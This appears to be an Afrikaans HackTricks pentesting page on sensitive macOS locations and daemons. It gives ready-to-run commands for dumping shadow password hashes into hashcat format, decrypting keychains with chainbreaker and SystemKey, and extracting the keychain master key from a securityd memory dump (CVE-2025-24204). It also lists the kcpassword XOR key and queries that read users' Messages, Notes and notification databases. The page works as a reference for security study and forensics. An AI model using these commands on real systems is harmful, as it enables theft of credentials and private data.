# macOS Sensitiewe Liggings & Interessante Daemons

{{#include ../../../banners/hacktricks-training.md}}

## Wagwoorde

### Shadow Wagwoorde

Shadow password word gestoor saam met die gebruiker se konfigurasie in plists geleë in **`/var/db/dslocal/nodes/Default/users/`**.\
Die volgende oneliner kan gebruik word om **al die inligting oor die gebruikers** te dump (insluitend hash info):
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Skripte soos hierdie een**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) of [**hierdie een**](https://github.com/octomagon/davegrohl.git) kan gebruik word om die hash na **hashcat** **format** te transformeer.

'n Alternatiewe one-liner wat creds van alle nie-service accounts in hashcat format `-m 7100` (macOS PBKDF2-SHA512) sal dump:
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Nog ’n manier om die `ShadowHashData` van ’n gebruiker te verkry, is deur `dscl` te gebruik: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Hierdie lêer word **slegs gebruik** wanneer die stelsel-ID in **single-user mode** loop (dus nie baie gereeld nie).

### Keychain Dump

Let daarop dat wanneer die `security`-binary gebruik word om die wagwoorde **gedekripteer uit te dump**, verskeie prompts die gebruiker sal vra om hierdie operasie toe te laat.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
Op moderne macOS is die interessantste backing stores gewoonlik **`~/Library/Keychains/login.keychain-db`** en **`/Library/Keychains/System.keychain`**. Hulle is SQLite-gebaseerde lêers, maar plaintext-toegang word steeds deur **`securityd`** bemiddel: om die rou DB te steel gee jou hoofsaaklik metadata en geënkripteerde blobs tensy jy ook die gebruiker se wagwoord, `SystemKey`, of 'n in-memory master key herwin.

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Gebaseer op hierdie kommentaar [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) lyk dit of hierdie tools nie meer werk in Big Sur nie.

### Keychaindump Oorsig

'n Tool genaamd **keychaindump** is ontwikkel om wagwoorde uit macOS keychains te onttrek, maar dit stuit op beperkings in nuwer macOS-weergawes soos Big Sur, soos aangedui in 'n [bespreking](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Die gebruik van **keychaindump** vereis dat die aanvaller toegang verkry en privileges na **root** eskaleer. Die tool maak gebruik van die feit dat die keychain by verstek ontsluit word wanneer die gebruiker aanmeld, vir gerief, wat toepassings toelaat om toegang daartoe te kry sonder om die gebruiker se wagwoord herhaaldelik te vereis. As 'n gebruiker egter kies om sy keychain na elke gebruik te sluit, word **keychaindump** ondoeltreffend.

**Keychaindump** werk deur 'n spesifieke proses genaamd **securityd** te teiken, beskryf deur Apple as 'n daemon vir authorisatie- en kriptografiese operasies, noodsaaklik vir toegang tot die keychain. Die ekstraksieproses behels die identifisering van 'n **Master Key** wat van die gebruiker se login-wagwoord afgelei is. Hierdie sleutel is noodsaaklik om die keychain-lêer te lees. Om die **Master Key** op te spoor, skandeer **keychaindump** die geheue-heap van **securityd** met die `vmmap`-opdrag, en soek na moontlike sleutels binne areas wat as `MALLOC_TINY` gemerk is. Die volgende opdrag word gebruik om hierdie geheue-liggings te inspekteer:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Ná die identifisering van potensiële hoofsleutels, deursoek **keychaindump** die heaps vir ’n spesifieke patroon (`0x0000000000000018`) wat ’n kandidaat vir die hoofsleutel aandui. Verdere stappe, insluitend deobfuscation, is nodig om hierdie sleutel te gebruik, soos uiteengesit in **keychaindump** se bronkode. Ontleders wat op hierdie gebied fokus, moet daarop let dat die kritieke data vir die dekripsie van die keychain binne die geheue van die **securityd**-proses gestoor word. ’n Voorbeeld van ’n opdrag om **keychaindump** te laat loop is:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) kan gebruik word om die volgende tipes inligting uit 'n OSX keychain op 'n forensies-korrekte manier te onttrek:

- Hashed Keychain-wagwoord, geskik vir cracking met [hashcat](https://hashcat.net/hashcat/) of [John the Ripper](https://www.openwall.com/john/)
- Internet Passwords
- Generic Passwords
- Private Keys
- Public Keys
- X509 Certificates
- Secure Notes
- Appleshare Passwords

Met die keychain-ontsluitwagwoord, 'n master key verkry met [volafox](https://github.com/n0fate/volafox) of [volatility](https://github.com/volatilityfoundation/volatility), of 'n ontsluitlêer soos SystemKey, sal Chainbreaker ook plaintext passwords verskaf.

Sonder een van hierdie metodes om die Keychain te ontsluit, sal Chainbreaker alle ander beskikbare inligting vertoon.

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Dompel sleutelhouer-sleutels (met wagwoorde) met SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (met wagwoorde) deur die hash te kraak**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain-sleutels (met wagwoorde) met memory dump**

[Volg hierdie stappe](../index.html#dumping-memory-with-osxpmem) om 'n **memory dump** uit te voer
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain-sleutels (met wagwoorde) deur die gebruiker se wagwoord te gebruik**

As jy die gebruiker se wagwoord ken, kan jy dit gebruik om **keychains te dump en te dekripteer wat aan die gebruiker behoort**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### Keychain hoofsleutel via `gcore` entitlement (CVE-2025-24204)

macOS 15.0 (Sequoia) het `/usr/bin/gcore` met die **`com.apple.system-task-ports.read`** entitlement verskeep, so enige plaaslike admin (of kwaadwillige gesigneerde app) kon **enige prosesgeheue dump, selfs met SIP/TCC afgedwing**. Die dump van `securityd` lek die **Keychain-hoofsleutel** in duidelike teks en laat jou toe om `login.keychain-db` te ontsleutel sonder die gebruiker se wagwoord.

**Vinnige repro op kwesbare builds (15.0–15.2):**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Voer die onttrekte hex-sleutel aan Chainbreaker (`--key <hex>`) om die login keychain te dekripteer. Apple het die entitlement in **macOS 15.3+** verwyder, so dit werk net op ongepatchte Sequoia builds of stelsels wat die kwesbare binary behou het.

### kcpassword

Die **kcpassword** file is ’n file wat die **user se login password** bevat, maar net as die stelsel-eienaar **outomatiese aanmelding** geaktiveer het. Daarom sal die user outomaties aangemeld word sonder om vir ’n password gevra te word (wat nie baie secure is nie).

Die password word in die file **`/etc/kcpassword`** gestoor, xored met die key **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. As die user se password langer as die key is, sal die key hergebruik word.\
Dit maak die password redelik maklik om te recover, byvoorbeeld met scripts soos [**this one**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Interesting Information in Databases

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Kennisgewings

Voor **Sequoia**, kan jy gewoonlik die Notification Center store vind in **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**. In **Sequoia+** het Apple dit geskuif na die TCC-beskermde group container **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**.

Die meeste van die interessante inligting word binne **blob** kolomme gestoor, so jy sal daardie inhoud moet onttrek en dit omskakel na iets mensleesbaar (`plutil -p -`, `strings`, of 'n klein parser). Quick triage examples:
```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```
#### Onlangse privaatheidskwessies (NotificationCenter DB)

- In macOS **14.7–15.1** het Apple banierinhoud in die `db2/db` SQLite gestoor sonder behoorlike redaksie. CVEs **CVE-2024-44292/44293/40838/54504** het enige plaaslike gebruiker in staat gestel om ander gebruikers se kennisgewingsteks te lees net deur die DB oop te maak (geen TCC-prompt).
- Apple het dit versag deur die DB na `group.com.apple.usernoted` te skuif en dit met TCC op nuwer Sequoia-builds te beskerm, so op huidige stelsels het jy gewoonlik die regte user context of 'n TCC bypass nodig om dit te lees.
- Op legacy endpoints, kopieer die `db`, `db-wal`, en `db-shm` lêers saam voor opdatering of herlaai as jy die artefacts wil bewaar.

### Notes

Die gebruikers **notes** kan gevind word in `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```
As die eenreël hierbo te raserig is, voer `ZICNOTEDATA.ZDATA` uit, gunzip dit, en ontleed die protobuf: dit is gewoonlik meer betroubaar as om `strings` direk op die SQLite uit te voer.

### Agtergrondtake / Login Items

Sedert **Ventura** word gebruiker-goedgekeurde login items en verskeie agtergrondtake in **BTM**-stores nagespoor soos **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** en die weergawe-gehoue stelselkas **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**.

Hierdie lêers is nuttig om vinnig persistence, helper tools, en sommige MDM-bestuurde agtergronditems te identifiseer:
```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```
Vir die persistence-hoek en BTM-internals, kyk [the auto-start locations page](../../macos-auto-start-locations.md#login-items) en [the Background Tasks Management notes](../macos-security-protections/README.md#background-tasks-management).

## Preferences

In macOS is app-voorkeure geleë in **`$HOME/Library/Preferences`** en in iOS is hulle in `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

In macOS kan die cli tool **`defaults`** gebruik word om die **Preferences file** te wysig.

**`/usr/sbin/cfprefsd`** eis die XPC services `com.apple.cfprefsd.daemon` en `com.apple.cfprefsd.agent` op en kan aangeroep word om aksies uit te voer soos om preferences te wysig.

## OpenDirectory permissions.plist

Die file `/System/Library/OpenDirectory/permissions.plist` bevat permissions wat op node attributes toegepas word en word deur SIP beskerm.\
Hierdie file verleen permissions aan spesifieke users per UUID (en nie uid nie) sodat hulle toegang kan kry tot spesifieke sensitiewe information soos `ShadowHashData`, `HeimdalSRPKey` en `KerberosKeys` onder andere:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## System Notifications

### Darwin Notifications

Die hoof daemon vir notifications is **`/usr/sbin/notifyd`**. Om notifications te ontvang, moet clients registreer deur die `com.apple.system.notification_center` Mach port (check hulle met `sudo lsmp -p <pid notifyd>`). Die daemon is configurable met die lêer `/etc/notify.conf`.

Die name wat gebruik word vir notifications is unique reverse DNS notation en wanneer 'n notification gestuur word aan een van hulle, sal die client(s) wat aangedui het dat hulle dit kan hanteer dit ontvang.

Dit is moontlik om die current status te dump (en al die name te sien) deur die signal SIGUSR2 na die notifyd process te stuur en die gegenereerde lêer te lees: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

Die **Distributed Notification Center** waarvan die hoofbinêr **`/usr/sbin/distnoted`**, is nog 'n manier om kennisgewings te stuur. Dit stel sommige XPC-dienste bloot en voer 'n paar kontroles uit om te probeer om kliënte te verifieer.

### Apple Push Notifications (APN)

In hierdie geval kan toepassings vir **topics** registreer. Die kliënt sal 'n token genereer deur met Apple se bedieners te kontak via **`apsd`**.\
Dan sal verskaffers ook 'n token gegenereer het en in staat wees om met Apple se bedieners te koppel om boodskappe na die kliënte te stuur. Hierdie boodskappe sal plaaslik ontvang word deur **`apsd`** wat die kennisgewing aan die toepassing wat daarvoor wag, sal deurgee.

Die voorkeure is geleë in `/Library/Preferences/com.apple.apsd.plist`.

Daar is 'n plaaslike databasis van boodskappe in macOS geleë in `/Library/Application\ Support/ApplePushService/aps.db` en in iOS in `/var/mobile/Library/ApplePushService`. Dit het 3 tabelle: `incoming_messages`, `outgoing_messages` en `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Dit is ook moontlik om inligting oor die daemon en verbindings te kry deur gebruik te maak van:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## User Notifications

Hierdie is kennisgewings wat die gebruiker op die skerm moet sien:

- **`CFUserNotification`**: Hierdie API bied ’n manier om in die skerm ’n pop-up met ’n boodskap te wys.
- **The Bulletin Board**: Dit wys in iOS ’n banier wat verdwyn en in die Notification Center gestoor sal word.
- **`NSUserNotificationCenter`**: Dit is die iOS bulletin board in MacOS. Op ouer macOS-uitgawes leef die databasis gewoonlik in `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`; op Sequoia+ is dit geskuif na `~/Library/Group Containers/group.com.apple.usernoted/db2/db`.

## References

- [HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [Apple Platform Security – Keychain data protection](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [9to5Mac – Apple addresses privacy concerns around Notification Center database in macOS Sequoia](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)

{{#include ../../../banners/hacktricks-training.md}}
